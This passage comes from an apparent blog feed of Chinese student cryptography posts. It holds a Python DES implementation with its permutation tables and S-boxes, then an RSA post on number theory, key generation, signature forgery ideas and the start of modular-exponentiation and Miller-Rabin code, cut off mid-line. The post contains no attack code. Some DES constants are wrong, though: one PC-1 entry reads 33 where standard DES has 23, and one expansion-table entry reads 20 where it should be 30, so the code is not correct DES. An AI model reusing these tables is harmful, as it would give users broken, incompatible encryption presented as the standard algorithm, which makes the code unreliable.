class="number">13</span>]]</span><br><span class="line"></span><br><span class="line">s7 = [</span><br><span class="line">    [<span class="number">4</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">13</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">6</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">2</span>],</span><br><span class="line">    [<span class="number">6</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">12</span>]]</span><br><span class="line"></span><br><span class="line">s8 = [</span><br><span class="line">    [<span class="number">13</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">7</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">2</span>],</span><br><span class="line">    [<span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>],</span><br><span class="line">    [<span class="number">2</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>]]</span><br><span class="line"></span><br><span class="line">ip = [<span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">      <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">64</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>,</span><br><span class="line">      <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line">      <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>]</span><br><span class="line"></span><br><span class="line">_ip = [<span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">       <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>, <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">       <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>, <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">       <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>, <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>]</span><br><span class="line"></span><br><span class="line">pc1=[<span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>,</span><br><span class="line">  <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>,</span><br><span class="line">  <span class="number">10</span>, <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>,</span><br><span class="line">  <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>,</span><br><span class="line">  <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">33</span>, <span class="number">15</span>,</span><br><span class="line">  <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>,</span><br><span class="line">  <span class="number">14</span>, <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>,</span><br><span class="line">  <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">pc2= [<span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">28</span>,</span><br><span class="line">  <span class="number">15</span>, <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>, <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">  <span class="number">26</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">2</span>,</span><br><span class="line">  <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>, <span class="number">30</span>, <span class="number">40</span>,</span><br><span class="line">  <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>, <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>,</span><br><span class="line">  <span class="number">34</span>, <span class="number">53</span>, <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>]</span><br><span class="line"></span><br><span class="line">e=[<span class="number">32</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,</span><br><span class="line">   <span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,</span><br><span class="line">   <span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,</span><br><span class="line">   <span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,</span><br><span class="line">   <span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,</span><br><span class="line">   <span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,</span><br><span class="line">   <span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,</span><br><span class="line">   <span class="number">28</span>,<span class="number">29</span>,<span class="number">20</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">p=[<span class="number">16</span>,<span class="number">7</span>,<span class="number">20</span>,<span class="number">21</span>,</span><br><span class="line">   <span class="number">29</span>,<span class="number">12</span>,<span class="number">28</span>,<span class="number">17</span>,</span><br><span class="line">   <span class="number">1</span>,<span class="number">15</span>,<span class="number">23</span>,<span class="number">26</span>,</span><br><span class="line">   <span class="number">5</span>,<span class="number">18</span>,<span class="number">31</span>,<span class="number">10</span>,</span><br><span class="line">   <span class="number">2</span>,<span class="number">8</span>,<span class="number">24</span>,<span class="number">14</span>,</span><br><span class="line">   <span class="number">32</span>,<span class="number">27</span>,<span class="number">3</span>,<span class="number">9</span>,</span><br><span class="line">   <span class="number">19</span>,<span class="number">13</span>,<span class="number">30</span>,<span class="number">6</span>,</span><br><span class="line">   <span class="number">22</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">25</span>]</span><br><span class="line"></span><br><span class="line">S=[s1,s2,s3,s4,s5,s6,s7,s8]    <span class="comment">#S盒</span></span><br><span class="line">LS=[<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>]   <span class="comment">#迭代次数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2bin</span><span class="params">(str)</span>:</span>       <span class="comment">#字符转二进制</span></span><br><span class="line">    res=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">        temp=bin(ord(i))[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br><span class="line">        res+=temp</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(str1,str2)</span>:</span>     <span class="comment">#字符异或</span></span><br><span class="line">    res=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str1[i]==str2[i]:</span><br><span class="line">            res+=<span class="string">'0'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res+=<span class="string">'1'</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keyPc1</span><span class="params">(str)</span>:</span>      <span class="comment">#PC1置换去掉奇偶校验</span></span><br><span class="line">    res=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> pc1:</span><br><span class="line">        res+=str[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leftMove</span><span class="params">(str,k)</span>:</span>        <span class="comment">#循环左移</span></span><br><span class="line">    <span class="keyword">return</span> str[k:]+str[:k]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keyPc2</span><span class="params">(str)</span>:</span>         <span class="comment">#PC2压缩置换</span></span><br><span class="line">    res=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> pc2:</span><br><span class="line">        res+=str[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keyGenerate</span><span class="params">(str)</span>:</span>     <span class="comment">#16轮，每轮生成48位轮密钥</span></span><br><span class="line">    keylist=[]</span><br><span class="line">    key_pc1=keyPc1(str)</span><br><span class="line">    key_c=key_pc1[<span class="number">0</span>:<span class="number">28</span>]</span><br><span class="line">    key_d=key_pc1[<span class="number">28</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> LS:</span><br><span class="line">        key_c=leftMove(key_c,i)</span><br><span class="line">        key_d=leftMove(key_d,i)</span><br><span class="line">        key_t=key_c+key_d</span><br><span class="line">        key_pc2=keyPc2(key_t)</span><br><span class="line">        keylist.append(key_pc2)</span><br><span class="line">    <span class="keyword">return</span> keylist</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#加密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">iP</span><span class="params">(str)</span>:</span>       <span class="comment">#IP置换</span></span><br><span class="line">    res=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ip:</span><br><span class="line">        res+=str[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeE</span><span class="params">(str)</span>:</span>           <span class="comment">#E盒压缩变换</span></span><br><span class="line">    res=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> e:</span><br><span class="line">        res+=str[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeS</span><span class="params">(str)</span>:</span>    <span class="comment">#S盒压缩变换</span></span><br><span class="line">    res=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        row=int(str[i*<span class="number">6</span>]+str[i*<span class="number">6</span>+<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">        column=int(str[i*<span class="number">6</span>+<span class="number">1</span>:i*<span class="number">6</span>+<span class="number">4</span>],<span class="number">2</span>)</span><br><span class="line">        res+=bin(S[i][row][column])[<span class="number">2</span>:].zfill(<span class="number">4</span>)        <span class="comment">#6位变4位</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeP</span><span class="params">(str)</span>:</span>    <span class="comment">#P盒置换</span></span><br><span class="line">    res=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> p:</span><br><span class="line">        res+=str[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_iP</span><span class="params">(str)</span>:</span>          <span class="comment">#IP逆置换</span></span><br><span class="line">    res=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> _ip:</span><br><span class="line">        res+=str[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeF</span><span class="params">(str,key)</span>:</span></span><br><span class="line">    str_e=changeE(str)</span><br><span class="line">    str_xor=xor(str_e,key)</span><br><span class="line">    str_s=changeS(str_xor)</span><br><span class="line">    str_p=changeP(str_s)</span><br><span class="line">    <span class="keyword">return</span> str_p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DesEncrypt</span><span class="params">(plain,key)</span>:</span></span><br><span class="line">    plain_bin=str2bin(plain)</span><br><span class="line">    key_bin=str2bin(key)</span><br><span class="line">    keylist=keyGenerate(key_bin)</span><br><span class="line">    plain_ip=iP(plain_bin)</span><br><span class="line">    plain_left=plain_ip[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">    plain_right=plain_ip[<span class="number">32</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">15</span>):</span><br><span class="line">        plain_temp=plain_right</span><br><span class="line">        plain_right=xor(plain_left,changeF(plain_right,keylist[i]))</span><br><span class="line">        plain_left=plain_temp</span><br><span class="line">    left_final=xor(plain_left,changeF(plain_right,keylist[<span class="number">15</span>]))</span><br><span class="line">    right_final=plain_right</span><br><span class="line">    plain_final=left_final+right_final</span><br><span class="line">    cipher=_iP(plain_final)</span><br><span class="line">    res=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(cipher),<span class="number">8</span>):</span><br><span class="line">        res+=chr(int(cipher[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DesDecrypt</span><span class="params">(cipher,key)</span>:</span></span><br><span class="line">    cipher_bin=str2bin(cipher)</span><br><span class="line">    key_bin=str2bin(key)</span><br><span class="line">    keylist=keyGenerate(key_bin)</span><br><span class="line">    cipher_ip=iP(cipher_bin)</span><br><span class="line">    cipher_left=cipher_ip[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">    cipher_right=cipher_ip[<span class="number">32</span>:]</span><br><span class="line">    j=<span class="number">15</span></span><br><span class="line">    <span class="keyword">while</span> j&gt;<span class="number">0</span>:</span><br><span class="line">        cipher_temp = cipher_right</span><br><span class="line">        cipher_right=xor(cipher_left,changeF(cipher_right,keylist[j]))</span><br><span class="line">        cipher_left=cipher_temp</span><br><span class="line">        j-=<span class="number">1</span></span><br><span class="line">    left_final=xor(cipher_left,changeF(cipher_right,keylist[<span class="number">0</span>]))</span><br><span class="line">    right_final=cipher_right</span><br><span class="line">    cipher_final = left_final + right_final</span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    cipher = _iP(cipher_final)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(cipher), <span class="number">8</span>):</span><br><span class="line">        res += chr(int(cipher[i:i + <span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    choice = input(<span class="string">"1.加密输1\n2.解密输2\n"</span>)</span><br><span class="line">    key = input(<span class="string">"输入key: "</span>)</span><br><span class="line">    <span class="keyword">if</span> choice == <span class="string">'1'</span>:</span><br><span class="line">        plain=input(<span class="string">"输入明文: "</span>)</span><br><span class="line">        cipher=DesEncrypt(plain,key)</span><br><span class="line">        print(cipher)</span><br><span class="line">        file=open(<span class="string">'DES_cipher.txt'</span>,<span class="string">'wb'</span>)</span><br><span class="line">        file.write(cipher.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">        file.close()</span><br><span class="line">    <span class="keyword">elif</span> choice == <span class="string">'2'</span>:</span><br><span class="line">        cipher=input(<span class="string">"输入密文: "</span>)</span><br><span class="line">        print(DesDecrypt(cipher,key))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"请输入1-3！\n"</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DES思路&quot;&gt;&lt;a href=&quot;#DES思路&quot; class=&quot;headerlink&quot; title=&quot;DES思路&quot;&gt;&lt;/a&gt;DES思路&lt;/h1&gt;&lt;p&gt;1.首先输入64bit密钥&lt;br&gt;2.将64bit密钥经过PC-1盒变成56bit&lt;br&gt;3.将56bit分为C0和
      
    
    </summary>
    
      <category term="crypto" scheme="http://yoursite.com/categories/crypto/"/>
    
    
      <category term="crypto" scheme="http://yoursite.com/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>RSA实现</title>
    <link href="http://yoursite.com/2018/12/25/RSA/"/>
    <id>http://yoursite.com/2018/12/25/RSA/</id>
    <published>2018-12-24T16:00:00.000Z</published>
    <updated>2018-12-28T08:08:44.560Z</updated>
    
    <content type="html"><![CDATA[<p>  临近期末了，剩下Java和密码学两门课了，正好有密码学课程设计，借此机会记录自己写的算法，每写一个算法就当巩固之前的算法知识和信息安全数学基础的知识了。</p><h1 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h1><ol><li>乘法逆元<br>如果ax≡1 (mod p),且gcd(a,p)=1（a与p互质），则称a关于模p的乘法逆元为x。</li><li>费马小定理<br>假如a是一个整数，p是一个质数，那么a^p - a是p的倍数，可以表示为<br>a^p≡a(mod p)<br>a^(p-1)≡1(mod p)</li><li>扩展欧几里得定理<br>ax+by=gcd(a,b)</li><li><p>逆元求解</p><ul><li>扩展欧几里得出发 ax≡1(mod m)—-&gt;  ax-my≡1</li><li>费马小定理 a^(p-1)≡1（mod p） —&gt;  a^(p-2)≡a^-1(mod p) <h1 id="密钥生成"><a href="#密钥生成" class="headerlink" title="密钥生成"></a>密钥生成</h1></li></ul></li><li>选择两个大素数p和q</li><li>计算n=pq。 </li><li>计算φ(n)=(p-1)(q-1)</li><li><strong>随机选择一个整数e，条件是1&lt; e &lt; φ(n)，gcd(e,φ(n))=1</strong></li><li><strong>计算ed ≡ 1 (mod φ(n))    (e对于φ(n)的模反元素d)</strong></li><li>将n和e封装成公钥，n和d封装成私钥  (n,e)—-(n,d)<br>整个过程实际就是计算n e d的过程<br>这里用到欧拉函数的性质,由n==pq得出(p-1)(q-1)=φ(n)<h1 id="RSA算法可靠性"><a href="#RSA算法可靠性" class="headerlink" title="RSA算法可靠性"></a>RSA算法可靠性</h1>对于p,q,n,φ(n),e,d,在已知n和e能推到d吗?</li></ol><ul><li>ed=1 (mod φ(n))。只有知道e和φ(n)，才能算出d。</li><li>φ(n)=(p-1)(q-1)。只有知道p和q，才能算出φ(n)。</li><li>n=pq。只有将n因数分解，才能算出p和q。</li></ul><p>因此只有n可以被因数分解，d就可以算出，也就意味着私钥被破解.但是RSA就是基于大整数因式分解的难题.</p><h1 id="加密与解密"><a href="#加密与解密" class="headerlink" title="加密与解密"></a>加密与解密</h1><p>加密m^e ≡ c (mod n)   假如Alice向Bob发送m,用Bob的公钥(n,e)对m加密(m小于n)生成c发送给Bob,</p><p>解密c^d ≡ m (mod n)      Bob用私钥(n,d)对c进行解密</p><h2 id="计算过程"><a href="#计算过程" class="headerlink" title="计算过程"></a>计算过程</h2><ol><li>快速幂模算法</li><li>素性检测</li><li>扩展欧几里得求逆元</li><li>生成随机素数</li><li>产生n.e.d</li><li>加密解密</li></ol><h1 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h1><p>后续复习补上……</p><hr><h1 id="RSA数字签名方案"><a href="#RSA数字签名方案" class="headerlink" title="RSA数字签名方案"></a>RSA数字签名方案</h1><p>私钥加密，公钥解密。</p><ol><li>密钥的生成（与加密系统一样）：<pre><code>公钥𝑃𝑘={𝑒,𝑛};私钥𝑆𝑘={𝑑}</code></pre></li><li>签名过程 (𝑑,𝑛)：用户A对消息𝑀∈𝑍_𝑛进行签名，计算<pre><code>𝑆=𝑆𝑖𝑔(𝐻(𝑀))=𝐻(𝑀)𝑑 𝑚𝑜𝑑 𝑛；</code></pre> 并将𝑆附在消息𝑀后</li><li>验证过程 (𝑒,𝑛)：<br>  给定(𝑀,𝑆)，𝑉𝑒𝑟(𝑀,𝑆)为真⟺<pre><code>𝐻(𝑀)=𝑆^𝑒  (𝑚𝑜𝑑 𝑛)成立</code></pre></li></ol><h1 id="RSA签名攻击"><a href="#RSA签名攻击" class="headerlink" title="RSA签名攻击"></a>RSA签名攻击</h1><ol><li>直接对消息签名，用A的公钥计算𝑋＝𝑌𝑒 𝑚𝑜𝑑 𝑛，于是便可以用𝒀伪造A对消息𝑿的签名（hash函数可抵御这种攻击）</li><li>已有签名进行攻击 𝑆𝑖𝑔(𝑀1𝑀2) = 𝑆𝑖𝑔(𝑀1)𝑆𝑖𝑔(𝑀2)</li><li>利用签名获得明文</li></ol><h1 id="贴代码"><a href="#贴代码" class="headerlink" title="贴代码"></a>贴代码</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="comment">#快速幂模运算</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fastMod</span><span class="params">(b,e,n)</span>:</span></span><br><span class="line">    result=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> e!=<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span>(e&amp;<span class="number">1</span>)==<span class="number">1</span>:</span><br><span class="line">            result=(result*b)%n</span><br><span class="line">        e&gt;&gt;=<span class="number">1</span></span><br><span class="line">        b=(b*b)%n</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(fastMod(2537,224,13))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Miller-Rabin素性测试</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MillerPrime</span><span class="params">(n)</span>:</span></span><br><span class="line">    q=n<span class="number">-1</span></span><br><span class="line">    k=<span class="number">0</span></span><br><span class="line">    <span class="comment">#2^k*q==n-1</span></span><br><span class="line">    <span class="keyword">while</span> q%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">        k+=<span class="number">1</span></span><br><span class="line">        q//=<span class="number">2</span></span><br><span class="line">    <span class="comment">#测试次数为8</span></span><br><span class="line">    <span class="keyword">for</span> trials <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        a=random.randrange(<span 